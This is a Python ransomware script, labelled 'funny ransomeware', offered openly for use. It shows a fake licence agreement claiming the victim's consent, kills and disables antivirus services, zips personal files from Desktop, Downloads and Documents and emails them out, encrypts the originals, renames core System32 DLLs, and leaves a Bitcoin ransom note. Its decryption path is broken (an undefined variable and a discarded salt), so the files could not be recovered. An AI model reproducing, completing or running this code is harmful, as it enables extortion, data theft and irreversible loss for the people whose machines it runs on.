# funny ransomeware
# made by stami
import os
import sys
import platform
import time
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import getpass
import socket
import json
from datetime import datetime, timedelta
import threading
import shutil
import zipfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import tkinter as tk
from tkinter import scrolledtext, messagebox

agreed_to_terms = False

# --- Fake Terms and Conditions GUI ---


def show_terms_gui():
    global agreed_to_terms
    terms_window = tk.Tk()
    terms_window.title("Software License Agreement")

    terms_text = scrolledtext.ScrolledText(terms_window, width=80, height=20)
    terms_text.insert(tk.END, """
END-USER LICENSE AGREEMENT

This End-User License Agreement ("EULA") is a legal agreement between you (either an individual or a single entity) and [Your Funny Ransomware Name Here] regarding the use of this software (the "Software"). By clicking the "Accept" button or continuing to use the Software, you agree to be bound by the terms of this EULA. If you do not agree to the terms of this EULA, do not use the Software.

1. Grant of License: [Your Funny Ransomware Name Here] grants you a non-exclusive, non-transferable, limited license to use the Software for entertainment purposes only.

2. Intellectual Property: The Software is protected by copyright laws and international copyright treaties, as well as other intellectual property laws and treaties. [Your Funny Ransomware Name Here] owns all right, title, and interest in and to the Software.

3. Limitation of Liability: TO THE MAXIMUM EXTENT PERMITTED BY APPLICABLE LAW, IN NO EVENT SHALL [Your Funny RansomWARE NAME HERE] BE LIABLE FOR ANY SPECIAL, INCIDENTAL, INDIRECT, OR CONSEQUENTIAL DAMAGES WHATSOEVER (INCLUDING, WITHOUT LIMITATION, DAMAGES FOR LOSS OF BUSINESS PROFITS, BUSINESS INTERRUPTION, LOSS OF BUSINESS INFORMATION, OR ANY OTHER PECUNIARY LOSS) ARISING OUT OF THE USE OF OR INABILITY TO USE THE SOFTWARE.

4. Disclaimer of Warranty: THE SOFTWARE IS PROVIDED "AS IS" AND [YOUR FUNNY RANSOMWARE NAME HERE] DISCLAIMS ALL WARRANTIES, WHETHER EXPRESS OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.

5. **IMPORTANT - READ CAREFULLY:** By clicking "Accept," you hereby grant [Your Funny Ransomware Name Here] a non-exclusive, royalty-free, perpetual, irrevocable, worldwide license to temporarily or permanently restrict access to your computer system, encrypt your files, and store a copy of your data. You acknowledge that the sole method for potential recovery of your data is at the discretion of [Your Funny Ransomware Name Here] and may involve the transfer of digital currency. You waive any right to claim damages or seek legal recourse related to the inaccessibility of your data or system. This agreement serves as your explicit consent to these actions.

6. Governing Law: This EULA shall be governed by and construed in accordance with the laws of [Your Fictional Country/State].

7. Entire Agreement: This EULA constitutes the entire agreement between the parties and supersedes all prior or contemporaneous communications and proposals, whether oral or written.

By clicking "Accept," you acknowledge that you have had the opportunity to review these terms and conditions, have done so to the extent you deem necessary, and agree to be bound by them.
""")
    terms_text.config(state=tk.DISABLED)  # Make it read-only
    terms_text.pack(padx=10, pady=10)

    def accept_terms():
        global agreed_to_terms
        agreed_to_terms = True
        terms_window.destroy()

    accept_button = tk.Button(
        terms_window, text="Accept", command=accept_terms)
    accept_button.pack(pady=10)

    terms_window.mainloop()
    return agreed_to_terms


if not show_terms_gui():
    print("Terms not accepted. Exiting.")
    sys.exit(0)

# --- Attempting to Disable Anti-Virus (Best Effort - Windows Specific) ---


def attempt_disable_antivirus_windows():
    if platform.system() == "Windows":
        print("Attempting to temporarily disable some known anti-virus measures...")
        targets = {
            "processes": [
                "MsMpEng.exe", "avp.exe", "egui.exe", "avastui.exe", "ccSvcHst.exe",
                "vshield.exe", "BullGuardUI.exe", "avgui.exe", "360tray.exe", "ALYacSvc.exe",
                "ArcaTasksService.exe", "bdagent.exe", "clamtray.exe", "f-prot.exe",
                "guardgui.exe", "ravmond.exe", "sophosui.exe", "symantecservicehost.exe",
                "tpsrv.exe", "usysmon.exe"
            ],
            "services": [
                "WinDefend", "AVP", "ekrn", "AvastSvc", "NortonSecurity",
                "McAfee SiteAdvisor Service", "BullGuard Antivirus", "AVG AntiVirus",
                "360 Total Security", "ALYac Anti-Malware Service", "ArcaVir Antivirus Service",
                "Bitdefender Agent Service", "ClamWin Antivirus Service", "F-PROT Antivirus Service",
                "Panda Security Service", "Sophos Anti-Virus Service", "Symantec Endpoint Protection Service",
                "Trend Micro Solution Platform", "Comodo Agent Service"
            ]
        }
        for process in targets["processes"]:
            os.system(f"taskkill /f /im {process} 2>nul 1>nul")
            print(f"Attempted to terminate process: {process}")
            time.sleep(0.2)

        for service in targets["services"]:
            os.system(f'net stop "{service}" 2>nul 1>nul')
            os.system(f'sc config "{service}" start= disabled 2>nul 1>nul')
            print(f"Attempted to disable service: {service}")
            time.sleep(0.2)

        print("Finished attempting to disable common anti-virus measures. No guarantees though!\n")
    else:
        print("Anti-virus disabling attempts are specific to Windows in this example.\n")


attempt_disable_antivirus_windows()

# --- Configuration ---
BITCOIN_ADDRESS = sys.argv[2] if len(
    sys.argv) > 2 else "YOUR_BITCOIN_ADDRESS"  # add btc address here
RECIPIENT_EMAIL = ""
SENDER_EMAIL = "your_email@example.com"
SENDER_PASSWORD = "your_password"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
DESTRUCTION_DELAY_HOURS = 72
INFECTED_ID = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
UNLOCK_CODE = "AHJFPF39408HDKWPFGHhaofhfi89"
ATTEMPT_UNLOCK_INTERVAL = 60
ENCRYPTED_EXTENSION = ".encrypted_" + INFECTED_ID
LOCKED_FILE_SUFFIX = ".locked"
BITCOIN_AMOUNT = "0.05"
IMPORTANT_FOLDERS = [
    os.path.join(os.path.expanduser("~"), "Desktop"),
    os.path.join(os.path.expanduser("~"), "Downloads"),
    os.path.join(os.path.expanduser("~"), "Documents")
]

IMPORTANT_EXTENSIONS = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.jpeg', '.png', '.gif', '.txt',
                        '.csv', '.sql', '.mdb', '.accdb', '.psd', '.ai', '.dwg', '.zip', '.rar', '.tar.gz', '.tar.bz2', '.mp3', '.mp4', '.avi', '.mov']

SYSTEM32_PATH = "C:\\Windows\\System32" if platform.system() == "Windows" else "/usr/lib"

# --- Utility Functions ---


def generate_key(password_provided):
    password = password_provided.encode()
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        iterations=100000,
        salt=salt,
        length=32
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    return key, base64.b64encode(salt).decode()


def encrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        encrypted_file_path = file_path + ENCRYPTED_EXTENSION
        os.rename(file_path, encrypted_file_path)
        with open(encrypted_file_path, "wb") as file:
            file.write(encrypted_data)
        return True
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")
        return False


def decrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        original_file_path = file_path.replace(ENCRYPTED_EXTENSION, "")
        os.rename(file_path, original_file_path)
        with open(original_file_path, "wb") as file:
            file.write(decrypted_data)
        return True
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")
        return False
# whats happening here is its finding important files and then putting them in a zip and emailing it to the email you set earlier ❤


def find_important_files(base_dirs):
    important_files = []
    for base_dir in base_dirs:
        for root, _, files in os.walk(base_dir):
            for file in files:
                if any(file.endswith(ext) for ext in IMPORTANT_EXTENSIONS):
                    important_files.append(os.path.join(root, file))
    return important_files


def create_zip(file_paths, zip_filename):
    try:
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file_path in file_paths:
                zipf.write(file_path, os.path.basename(file_path))
        return True
    except Exception as e:
        print(f"Error creating ZIP file: {e}")
        return False


def send_email(recipient_email, subject, body, attachment_path):
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = recipient_email
        msg['Subject'] = subject

        msg.attach(MIMEText(body))

        with open(attachment_path, "rb") as attachment:
            part = MIMEBase("application", "zip")
            part.set_payload(attachment.read())

        encoders.encode_base64(part)
        part.add_header('Content-Disposition',
                        f"attachment; filename= {os.path.basename(attachment_path)}")
        msg.attach(part)

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, recipient_email, msg.as_string())
        print(
            f"Email sent successfully to {recipient_email} with attachment: {attachment_path}")
        return True
    except Exception as e:
        print(f"Error sending email: {e}")
        return False
# hold system 32 by the dih


def hold_system32_hostage():
    if platform.system() == "Windows":
        try:
            files_to_target = ["kernel32.dll", "user32.dll", "gdi32.dll"]
            locked_files = []
            for filename in files_to_target:
                filepath = os.path.join(SYSTEM32_PATH, filename)
                if os.path.exists(filepath) and not filepath.endswith(LOCKED_FILE_SUFFIX):
                    new_filepath = filepath + LOCKED_FILE_SUFFIX
                    try:
                        os.rename(filepath, new_filepath)
                        print(f"Locked: {filename}")
                        locked_files.append(filepath)
                    except Exception as e:
                        print(f"Error locking {filename}: {e}")
            return locked_files
        except Exception as e:
            print(f"Error accessing or modifying System32: {e}")
            return []
    else:
        print("System32 locking not implemented for non-Windows systems in this example.")
        return []


def revert_system32_changes(locked_files):
    if platform.system() == "Windows":
        for locked_file in locked_files:
            new_filepath = locked_file + LOCKED_FILE_SUFFIX
            if os.path.exists(new_filepath):
                try:
                    os.rename(new_filepath, locked_file)
                    print(f"Unlocked: {os.path.basename(locked_file)}")
                except Exception as e:
                    print(
                        f"Error unlocking {os.path.basename(locked_file)}: {e}")


def display_ransom_note(bitcoin_address, deadline):
    note = f"""
████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

YOUR IMPORTANT FILES HAVE BEEN COPIED, ENCRYPTED, AND YOUR SYSTEM IS COMPROMISED!

We have copied all your important files from your Desktop, Downloads, and Documents folders. A ZIP archive of these files has been sent to {RECIPIENT_EMAIL}. The files on your computer have also been encrypted, making them inaccessible.

Additionally, critical system files have been locked, which may prevent your computer from functioning correctly.

To regain access to your files and restore your system, you must send a payment of {BITCOIN_AMOUNT} Bitcoin (BTC) to the following address:

{bitcoin_address}

Once you have sent the payment, contact us (e.g., via Telegram) and provide your unique identification key: {INFECTED_ID}. We will then provide you with the following unlock code:

{UNLOCK_CODE}

Enter this code exactly as provided (case-sensitive) when prompted by the unlock tool that will appear shortly.

FAILURE TO PAY WITHIN {DESTRUCTION_DELAY_HOURS} HOURS MAY RESULT IN THE PERMANENT DESTRUCTION OF YOUR COPIED FILES.

WARNING: DO NOT ATTEMPT TO MODIFY OR DELETE THE ENCRYPTED FILES OR SYSTEM FILES. THIS WILL ONLY COMPLICATE THE RECOVERY PROCESS AND MAY LEAD TO IRREVERSIBLE DAMAGE.

████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
"""
    if platform.system() == "Windows":
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        ransom_note_path = os.path.join(desktop_path, "READ_ME_YOUR_FILES.txt")
        with open(ransom_note_path, "w") as f:
            f.write(note)
    else:
        home_path = os.path.expanduser("~")
        ransom_note_path = os.path.join(home_path, "READ_ME_YOUR_FILES.txt")
        with open(ransom_note_path, "w") as f:
            f.write(note)
    print(f"Ransom note has been saved to: {ransom_note_path}")


def attempt_unlock(key, locked_files):
    unlock_code_entered = input("Enter the unlock code: ")
    if unlock_code_entered == UNLOCK_CODE:
        print(
            "Correct unlock code entered! Attempting to decrypt files and restore system...")
        important_files = find_important_files(IMPORTANT_FOLDERS)
        decryption_successful = True
        for file_path in important_files:
            encrypted_file_path = file_path + ENCRYPTED_EXTENSION
            if os.path.exists(encrypted_file_path):
                if decrypt_file(encrypted_file_path, key):
                    print(f"Decrypted: {file_path}")
                else:
                    print(f"Error decrypting: {encrypted_file_path}")
                    decryption_successful = False
        revert_system32_changes(locked_files)
        if decryption_successful:
            print("Decryption and system restore completed successfully.")
        else:
            print("Decryption process encountered some errors.")
        return True
    else:
        print("Incorrect unlock code. Please try again.")
        return False


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python script.py <encryption_password> <bitcoin_address>")
        sys.exit(1)

    encryption_password = sys.argv[1]
    BITCOIN_ADDRESS = sys.argv[2]

    encryption_key, salt = generate_key(encryption_password)

    important_files = find_important_files(IMPORTANT_FOLDERS)
    if not important_files:
        print("No important files found in the target folders.")
    else:
        print(
            f"Found {len(important_files)} important files. Creating ZIP and encrypting...")
        zip_filename = os.path.join(os.path.expanduser(
            "~"), f"important_files_{INFECTED_ID}.zip")
        if create_zip(important_files, zip_filename):
            print(f"ZIP archive created: {zip_filename}")
            send_email(RECIPIENT_EMAIL, f"Infected Files - ID: {INFECTED_ID}",
                       "Attached is a ZIP archive of important files.", zip_filename)
            try:
                os.remove(zip_filename)  # Clean up the ZIP file after sending
            except Exception as e:
                print(f"Error removing ZIP file: {e}")

        for file_path in important_files:
            if encrypt_file(file_path, encryption_key):
                print(f"Encrypted: {file_path}")

    print("Attempting to hold System32 hostage...")
    locked_system_files = hold_system32_hostage()

    deadline = datetime.now() + timedelta(hours=DESTRUCTION_DELAY_HOURS)
    display_ransom_note(BITCOIN_ADDRESS, deadline)

    print("\nYour files have been encrypted and system files locked.")
    unlock_attempts = 0
    while True:
        unlock_attempts += 1
        if attempt_unlock(encryption_key, locked_system_files):
            break
        if unlock_attempts >= 3:
            print("Too many incorrect unlock attempts. Further attempts blocked.")
            break
        time.sleep(ATTEMPT_UNLOCK_INTERVAL)

    print("Ransomware operation finished.")